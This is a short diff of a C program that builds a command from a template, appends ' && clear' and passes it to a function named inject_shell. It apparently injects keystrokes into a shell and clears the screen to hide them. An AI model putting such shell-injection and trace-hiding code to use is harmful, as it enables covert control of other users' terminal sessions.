@@ -37,9 +37,8 @@ int main(int argc, char ** argv){
             strcat(buffer,TEMPLATE);
             target = (char) argv[1][0];
             buffer[11] = target;
-            buffer[12] = '\r';
-
-            // printf("%s\n",buffer);
+            buffer[12] = '\0';
+            strcat(buffer," && clear\r");
 
             inject_shell(buffer);
         }
